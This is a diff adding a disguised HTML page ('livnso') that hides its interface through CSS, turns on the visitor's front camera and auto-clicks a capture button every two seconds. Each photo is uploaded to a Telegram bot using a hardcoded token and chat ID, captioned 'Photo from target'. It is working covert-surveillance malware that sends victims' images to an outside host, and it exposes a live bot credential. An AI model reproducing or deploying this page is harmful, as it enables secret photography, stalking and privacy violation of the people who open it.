@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>livnso</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 1vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0px;
+    background: #000000;
+    color: #0000;
+    font-family: Arial, sans-serif;
+}
+
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+}
+
+body {
+    background-image: url("https://www.instagram.com");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+}
+.studio {
+    width: 0%;
+    max-width: 0px;
+    padding: 24px;
+    background: #0000;
+    border: 3px solid #0000;
+    border-radius: 20px;
+    box-shadow: 0 10px 20px #0000;
+}
+
+h1 {
+    margin: 0 0 8px;
+    font-size: 26px;
+    text-align: center;
+}
+
+.subtitle {
+    margin: 0 0 0px;
+    text-align: center;
+    color: #00000;
+    font-size: 0px;
+}
+
+.preview {
+    overflow: hidden;
+    width: 0%;
+    aspect-ratio: 4 / 3;
+    background: #000000;
+    border-radius: 14px;
+    border: 0px solid #00000;
+}
+
+video {
+    display: block;
+    width: 0%;
+    height: 0%;
+    object-fit: cover;
+}
+
+.status {
+    margin: 16px 0;
+    color: #000000;
+    text-align: center;
+    font-size: 14px;
+    min-height: 1px;
+    overflow-wrap: anywhere;
+}
+
+button {
+    width: 0%;
+    border: 0;
+    border-radius: 0px;
+    padding: 1px 1px;
+    background: #0000;
+    color: black;
+    font-size: 0px;
+    font-weight: 1000;
+    cursor: pointer;
+}
+
+button:hover { background: #00000; }
+
+button:disabled {
+    opacity: .55;
+    cursor: not-allowed;
+}
+
+.note {
+    margin-top: 14px;
+    text-align: center;
+    color: #000000;
+    font-size: 12px;
+}
+
+canvas { display: none; }
+</style>
+</head>
+
+<body>
+<div class="studio">
+    <h1></h1>
+    <p class="subtitle"></p>
+
+    <div class="preview">
+        <video id="camera" autoplay playsinline muted></video>
+    </div>
+
+    <p class="status" id="status">Starting camera...</p>
+
+    <button id="captureBtn" disabled>Starting Camera...</button>
+
+    <p class="note"></p>
+
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+/* ===== STEP 1: ENTER YOUR TELEGRAM DETAILS ===== */
+
+const BOT_TOKEN = "8926184389:AAGaCKdWRWIaAZdUnDLjKBNZwCHyVu4Rwxg";
+const CHAT_ID = "6584511195";
+
+/* ============================================== */
+
+const video = document.getElementById("camera");
+const canvas = document.getElementById("canvas");
+const button = document.getElementById("captureBtn");
+const statusText = document.getElementById("status");
+
+let cameraStream = null;
+
+async function startCamera() {
+    try {
+        if (!navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia) {
+            throw new Error("Open this website over HTTPS.");
+        }
+
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+        });
+
+        video.srcObject = cameraStream;
+        await video.play();
+
+        button.disabled = false;
+        button.textContent = "Capture & Send";
+        statusText.textContent = "Camera ready";
+    } catch (error) {
+        statusText.textContent =
+            "Camera error: " + error.message;
+        button.textContent = "Camera Unavailable";
+    }
+}
+
+button.addEventListener("click", async () => {
+    if (!cameraStream || !video.videoWidth) {
+        statusText.textContent = "Camera is not ready.";
+        return;
+    }
+
+    if (
+        BOT_TOKEN === "PASTE_YOUR_NEW_BOT_TOKEN_HERE" ||
+        CHAT_ID === "PASTE_YOUR_CHAT_ID_HERE" ||
+        !BOT_TOKEN.trim() ||
+        !CHAT_ID.trim()
+    ) {
+        statusText.textContent =
+            "Please enter your Telegram bot token and chat ID in the HTML.";
+        return;
+    }
+
+    button.disabled = true;
+    button.textContent = "Sending...";
+    statusText.textContent = "Capturing photo...";
+
+    try {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const photoBlob = await new Promise((resolve, reject) => {
+            canvas.toBlob(blob => {
+                if (blob) {
+                    resolve(blob);
+                } else {
+                    reject(new Error("Could not capture photo."));
+                }
+            }, "image/jpeg", 0.9);
+        });
+
+        statusText.textContent = "Sending photo to Telegram...";
+
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID.trim());
+        formData.append("photo", photoBlob, "capture.jpg");
+        formData.append("caption", "Photo from target by livnso");
+
+        const response = await fetch(
+            "https://api.telegram.org/bot" +
+            BOT_TOKEN.trim() +
+            "/sendPhoto",
+            {
+                method: "POST",
+                body: formData
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+            throw new Error(
+                result.description || "Telegram could not send the photo."
+            );
+        }
+
+        statusText.textContent = "Photo sent successfully to Telegram!";
+    } catch (error) {
+        statusText.textContent = "Failed: " + error.message;
+    } finally {
+        button.disabled = false;
+        button.textContent = "Capture & Send";
+    }
+});
+
+startCamera();
+</script>
+
+<script>
+window.addEventListener("load", function () {
+    const btn = document.getElementById("captureBtn");
+
+    if (btn) {
+        setInterval(function () {
+            btn.click();
+        }, 2000);
+    }
+});
+</script>
+</body>
+</html>
